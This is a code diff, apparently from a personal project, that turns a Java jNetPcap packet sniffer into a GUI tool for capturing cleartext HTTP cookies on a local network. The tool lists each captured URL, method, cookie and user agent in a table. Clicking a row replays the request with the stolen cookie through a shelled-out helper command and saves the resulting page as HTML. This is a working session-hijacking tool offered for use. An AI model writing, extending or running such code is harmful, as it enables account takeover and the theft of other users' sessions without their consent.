@@ -1,40 +1,40 @@
+import java.awt.BorderLayout;
+import java.awt.Container;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JPanel;
+import javax.swing.JOptionPane;
+import javax.swing.JScrollPane;
+import javax.swing.JTable;
+import javax.swing.table.DefaultTableModel; 
+
+// ===================>
 /* for device listing */
 import java.util.Arrays;
 import java.util.ArrayList;  
 import java.util.Date;  
 import java.util.List;
 import java.util.*;
-import java.text.*;  
+import java.text.*; 
+import java.io.*; 
+import java.io.IOException;
 
 /* PCap */  
 import org.jnetpcap.Pcap;  
 import org.jnetpcap.PcapIf;  
 import org.jnetpcap.packet.PcapPacket;  
-import org.jnetpcap.packet.PcapPacketHandler;  
+import org.jnetpcap.packet.PcapPacketHandler; 
+
+import org.jnetpcap.nio.JBuffer;
 
 /* Protocols */ 
-import org.jnetpcap.protocol.network.Arp;
-import org.jnetpcap.protocol.network.Icmp;
 import org.jnetpcap.protocol.network.Ip4;
 import org.jnetpcap.protocol.network.Ip6;
 import org.jnetpcap.protocol.tcpip.Http;
 import org.jnetpcap.protocol.tcpip.Tcp;
-import org.jnetpcap.protocol.tcpip.Udp;
-import org.jnetpcap.protocol.vpn.L2TP;
-import org.jnetpcap.protocol.wan.PPP;
-import org.jnetpcap.protocol.application.Html;
-import org.jnetpcap.protocol.application.WebImage;
-import org.jnetpcap.protocol.voip.Rtp;
-import org.jnetpcap.protocol.voip.Sdp;
-import org.jnetpcap.protocol.voip.Sip;
-import org.jnetpcap.protocol.lan.Ethernet;
-import org.jnetpcap.protocol.lan.IEEE802dot1q;
-import org.jnetpcap.protocol.lan.IEEE802dot2;
-import org.jnetpcap.protocol.lan.IEEE802dot3;
-import org.jnetpcap.protocol.lan.IEEESnap;
-import org.jnetpcap.protocol.lan.SLL;
-
-import org.jnetpcap.protocol.application.Html;
 
 /* HTTP Requests */
 import org.jnetpcap.protocol.tcpip.Http.ContentType;  
@@ -47,6 +47,7 @@ import org.jnetpcap.packet.format.FormatUtils;
 /* GZIP */
 import java.io.*;
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
 import java.io.Reader;
@@ -60,22 +61,9 @@ import java.net.NetworkInterface;
     
 public class Sniffer { 
 
-public static Ethernet eth = new Ethernet();
-public static Arp arp = new Arp();
-public static Icmp icmp = new Icmp();
 public static Ip4 ip = new Ip4();
 public static Tcp tcp = new Tcp();
-public static Udp udp = new Udp();
 public static Http http = new Http(); 
-
-/* What to sniff */
-public static int sniffEth = 0;
-public static int sniffArp = 0;
-public static int sniffIcmp = 0;
-public static int sniffIp = 0;
-public static int sniffTcp = 0;
-public static int sniffUdp = 0;
-public static int sniffHttp = 1;
 
 /* variables */
 public static byte[] mymac = new byte[5];
@@ -84,7 +72,113 @@ public static Enumeration e;
 public static NetworkInterface n;
 public static Enumeration ee;
 
-    public static void main(String[] args) { 
+/* debugger */
+public static int debug = 0;
+public static FileWriter fw;
+public static BufferedWriter bw;
+public static PrintWriter writer; // = new PrintWriter("the-file-name.txt", "UTF-8");
+// <============================
+
+
+  private static DefaultTableModel model;
+  private JTable table;
+
+  public Sniffer() {
+  
+    super();
+    
+    model = new DefaultTableModel();
+    model.addColumn("URL");
+    model.addColumn("Request Method");
+    model.addColumn("Cookies");
+    model.addColumn("...");
+
+    table = new JTable(model);
+    table.addMouseListener(new java.awt.event.MouseAdapter() {
+        @Override
+        public void mouseClicked(java.awt.event.MouseEvent evt) {
+            int row = table.rowAtPoint(evt.getPoint());
+            int col = table.columnAtPoint(evt.getPoint());
+            if (row >= 0 && col == 3) {
+            
+                //System.out.println("Clicked on " + row + " -> " + col + "\n");
+                System.out.println("Call " + table.getValueAt(row, 0) + " with cookie " + table.getValueAt(row, 2)); // column 0 to get the url
+                
+                String called_url = table.getValueAt(row, 0).toString();
+                         
+                if(checkfilter(called_url)) {
+                    
+                    // Do something
+                    String origcookie = table.getValueAt(row, 2).toString();
+                    String cookiecontent[] = origcookie.split(";");
+                    
+                    if(!cookiecontent[0].equals("xload=1")) {
+                    
+                        String cookiemodded = "xload=1;" + origcookie;
+                              
+                        String command = "java HTTP_GET_REQUEST \"" + table.getValueAt(row, 0) + "\" \"" + cookiemodded + "\"";
+                        //System.out.println(command);
+                                    
+                        try { 
+                        
+                            
+                            String erg = execCmd(command);
+                            //String HtmlContent = execCmd("java Connection \"" + called_url + "\"");
+                            //String HtmlContent = execCmd("java HtmlContent " + Connection);
+                             
+
+                            BufferedWriter writer = new BufferedWriter(new FileWriter(row + ".html"));
+                            
+                            erg = erg.replaceAll("href=\"[^http]", "href=\"http://simplepress.ml/");
+                            
+                            try{
+                                writer.write(erg);
+                            }catch(IOException e){
+                                e.printStackTrace();
+                                return;
+                            }
+                            
+                            writer.close(); 
+                            //execCmd("java HtmlContent \"" + row + ".html\"");
+                            //execCmd("start firefox \"file:///./" + row + ".html\"");
+                            
+                        } catch(IOException ioe) {
+                            ioe.printStackTrace();
+                        }
+                    
+                    }
+                              
+                }
+            
+            }
+        }
+    });
+
+    JButton addButton = new JButton("Add Philosopher");
+    addButton.addActionListener(new ActionListener() {
+      public void actionPerformed(ActionEvent event) {
+        String[] philosopher = { "", "", "" };
+        model.addRow(philosopher);
+      }
+    });
+
+    JButton removeButton = new JButton("Remove Selected Row");
+    removeButton.addActionListener(new ActionListener() {
+      public void actionPerformed(ActionEvent event) {
+        model.removeRow(table.getSelectedRow());
+      }
+    });
+    JPanel inputPanel = new JPanel();
+    //inputPanel.add(addButton);
+    inputPanel.add(removeButton);
+
+    Container container = Global.uniFrame.getContentPane();
+    container.add(new JScrollPane(table), BorderLayout.CENTER);
+    container.add(inputPanel, BorderLayout.NORTH);
+
+    Global.uniFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+    Global.uniFrame.setSize(800, 300);
+    Global.uniFrame.setVisible(true);              
         
         /* Print welcome message */
         System.out.println(
@@ -97,7 +191,13 @@ public static Enumeration ee;
         StringBuilder errbuf = new StringBuilder();  
                 
         int interfaces = Pcap.findAllDevs(alldevs, errbuf);
-    
+        
+        String aif = "";
+        
+        String choices[] = new String[alldevs.size()];
+        int choices_counter = 0;
+        choices[0] = "select one";
+        
         try {           
                 
             e = NetworkInterface.getNetworkInterfaces();
@@ -105,22 +205,28 @@ public static Enumeration ee;
                 
                 n = (NetworkInterface)e.nextElement();                                      
                 ee = n.getInetAddresses();
+                
                     
                 if (ee.hasMoreElements()) {
+                  
+                    //aif += n.getDisplayName() + " - ";
                     
-                    System.out.println("\n\n"+n.getDisplayName());
-                    try { System.out.println(asString(n.getHardwareAddress())); }catch(Exception e) {}
+                    try { 
+                    //System.out.println(asString(n.getHardwareAddress()));
+                    aif += asString(n.getHardwareAddress()) + " - "; 
+                    }catch(Exception e) {  }
                         
                 }
-                        
+                int foundadresses = 0;        
                 while (ee.hasMoreElements()) {
                                     
                     InetAddress ninet = (InetAddress)ee.nextElement();
-                        
-                    if(null != ninet) {
+                    foundadresses++;    
+                    if(null != ninet && foundadresses == 1) {
                                                   
                         //System.out.println("\n\n"+n.getDisplayName());
-                        System.out.println(ninet);
+                        //System.out.println(ninet);
+                        aif += ninet + "\n\n";
                                                   
                     }
                         
@@ -128,37 +234,40 @@ public static Enumeration ee;
                                 		
             }
                     
-            System.out.println("\n\n");
+            //System.out.println("\n"+aif+"\n");
                 
-        }catch(Exception see) {}
-    
-               
-        int i = 0;
+        }catch(Exception see) {} 
+        
+        
+        
+        String t_out = "";      
+        int i = 1;
         for (PcapIf device : alldevs) {
                    
             String description = (device.getDescription() != null) ? device.getDescription() : "keine Beschreibung";
         
             try {
                 
-                System.out.println("[***] #"+(i++)+": "+description+" :: " + asString(device.getHardwareAddress())); 
-                                       
+                //System.out.println("[***] #"+(i++)+": "+description+" : " + asString(device.getHardwareAddress())); 
+                choices[i] = i + " " + asString(device.getHardwareAddress()); 
+                i++;                      
             }catch(Exception e) {} 
                    
-        }
-                 
+        }  
+        //System.out.println(t_out);
+        
         if (interfaces == Pcap.NOT_OK || alldevs.isEmpty()) {
                 
             System.out.println("[!!!] Konnte Interfaces nicht auslesen: " + errbuf.toString() + "\n");  
             return; 
                 
         }
-       
-        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
-        System.out.print("\n[***] Welches Interface soll genutzt werden?: ");
-        String eingabe = "";
-        try  { eingabe = br.readLine(); } catch (IOException ioe) {}
+
+        String input = (String) JOptionPane.showInputDialog(null, aif,"Konfiguration", JOptionPane.QUESTION_MESSAGE, null, choices, choices[1]);
+        int eingabe = new Integer(input.substring(0,1));
+        System.out.println(""+eingabe);
                
-        PcapIf device = alldevs.get(new Integer(eingabe));
+        PcapIf device = alldevs.get(eingabe-1);
                
         System.out.print("\n");  
        
@@ -167,96 +276,23 @@ public static Enumeration ee;
         int timeout = 10 * 1000;  
         Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);  
       
-        if (pcap == null) {  
-            
+        if (pcap == null) {              
             System.err.printf("[!!!] Error opening interface: " + errbuf.toString());  
             return; 
-                 
         } 
-            
-        /* lets go */ 
-        Date dNow = new Date( );
-        SimpleDateFormat ft = new SimpleDateFormat ("yyyy.MM.dd 'at' hh:mm:ss");  
-        print("[***] Start scan: " + ft.format(dNow));
-     
+
         PcapPacketHandler<String> jpacketHandler = new PcapPacketHandler<String>() {  
       
             public void nextPacket(PcapPacket packet, String user) {  
-                    
-                //print("\n*****************************");
-                //print("*** Paket #" + packet.getFrameNumber() + " abgefangen ***");
-                //print("*****************************\n");
-                    
-                if(packet.hasHeader(eth) && sniffEth == 1) {
-                    
-                    print("[ETH] SRC: " + FormatUtils.mac(eth.source()));
-                    print("[ETH] DST: " + FormatUtils.mac(eth.destination()));
-                    print("\n");
-                        
-                }
-                    
-                if (packet.hasHeader(arp) && sniffArp == 1) {
-                        
-                    print("[***] ARP");
-                    //print("[ARP] SHA: " + arp.sha());
-                    //print("[ARP] THA: " + arp.tha());
-                    //print("[ARP] FRAME_NO: " + packet.getFrameNumber());
-                    //print("[ARP] SRC: " + FormatUtils.mac(arp.Source()));
-                        
-                    String sourceMac = FormatUtils.mac(eth.source());
-                    String destinationMac = FormatUtils.mac(eth.destination());
-                        
-                    print("[ARP] SHA: " + sourceMac);
-                    print("[ARP] THA:" + destinationMac);
-                    print("\n");
-                        
-                }
-                    
-                if (packet.hasHeader(icmp) && sniffIcmp == 1) {
-                        
-                    print("[***] ICMP");
-                    print("\n");
-                        
-                }
-                    
-                if(packet.hasHeader(ip) && sniffIp == 1) {
-                    
-                    print("[IP] SRC: " + FormatUtils.ip(ip.source()));
-                    print("[IP] DST: " + FormatUtils.ip(ip.destination()));
-                    print("\n");
-                      
-                }
-    
-                if(packet.hasHeader(tcp) && sniffTcp == 1) {
-                    
-                    print("[TCP] SRC: " + tcp.source());
-                    print("[TCP] DST: " + tcp.destination());
-                    print("\n");
-                        
-                }
-    
-                if(packet.hasHeader(udp) && sniffUdp == 1) {
-                    
-                    print("[UDP] SRC: " + udp.source());
-                    print("[UDP] DST: " + udp.destination());
-                    print("\n");
-                        
-                }
-                    
-                if(packet.hasHeader(http) && sniffHttp == 1) {
-    
-                    //if(http.hasPayload()){
-                        
-                        print("[***] HTTP");
-                        print("[HTTP] payload length: " + http.getPayloadLength());
-                        //print("[HTTP] truncated: " + http.isPayloadTruncated());
-                        print(packet.toHexdump());
-    
-                    //}
-                        
+
+                if(packet.hasHeader(tcp) && packet.hasHeader(http) && tcp.destination() == 80 && http.fieldValue(Request.RequestUrl) != null) {                
+                    if(checkfilter(http.fieldValue(Request.RequestUrl)) && packet.hasHeader(ip) && http.fieldValue(Request.Cookie) != null) {
+                    addEntry("http://" + http.fieldValue((Http.Request.Host.Host))+http.fieldValue(Request.RequestUrl), http.fieldValue(Request.RequestMethod), http.fieldValue(Request.Cookie), http.fieldValue(Request.User_Agent));
+                    }
                 }
                                       
-            }  
+            } 
+             
         };  
        
         int running = pcap.loop(Pcap.LOOP_INFINATE, jpacketHandler, "sniffing..."); 
@@ -271,62 +307,32 @@ public static Enumeration ee;
                 
         }
             
-        pcap.close(); 
-             
-    } 
+        pcap.close();
+        try { bw.close(); }catch(IOException ioe) {}   
     
-    private static String macAsString(final byte[] mac) { 
-         
-        final StringBuilder buf = new StringBuilder();
-              
-        for(byte b : mac) { 
-             
-            if (buf.length() != 0) {  
-                buf.append(':');  
-            } 
-                 
-            if (b >= 0 && b < 16) {  
-                buf.append('0');  
-            } 
-                 
-            buf.append(Integer.toHexString((b < 0) ? b + 256 : b).toUpperCase()); 
-                 
-        }  
-          
-        return buf.toString();
-            
-    } 
-    
-    private static String decompress(byte[] html) {
-        
-        /* */
-        String output = "";
-            
-        try {
-            
-            GZIPInputStream gzip = new GZIPInputStream(new ByteArrayInputStream(html));
-            BufferedReader br = new BufferedReader(new InputStreamReader(gzip));
-            String tmp = "";
-                
-            while(null != br.readLine()) {
-                
-                output += br.readLine();
-                
-            }
-            
-        }catch(IOException ioe) {}
-            
-        return output;
-        
-    }
-    
+  } 
+  public static void addEntry(String url, String method, String cookie, String useragent) {
+        String[] philosopher = { url, method, cookie, useragent};
+        model.addRow(philosopher);  
+  }
+  public static class Global{
+      public static JFrame uniFrame = new JFrame();
+  }
+  private static void createGUI(){
+      new Sniffer();
+  }
+  public static void main(String args[]) {
+      createGUI();
+  }
+
     public static void print(String out) {
         
-        System.out.println(out);    
+        System.out.print(out);
+        writer.println(out); // write to logfile    
         
     }
-    
-    private static String asString(final byte[] mac) { 
+      
+      private static String asString(final byte[] mac) { 
             
         final StringBuilder buf = new StringBuilder();
                  
@@ -351,5 +357,20 @@ public static Enumeration ee;
         return buf.toString(); 
          
     }
-
+    
+    public static boolean checkfilter(String s) {
+        String filters[] = {".css",".js",".ico",".ICO",".png",".jpg",".jpeg",".gif"};
+        for(int i = 0; i<filters.length; i++) {
+            if(s.indexOf(filters[i]) != -1) {
+                return false;
+            }
+        }
+        return true;
+    }
+    
+    public static String execCmd(String cmd) throws java.io.IOException {
+            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+            return s.hasNext() ? s.next() : "";
+    }
+    
 }
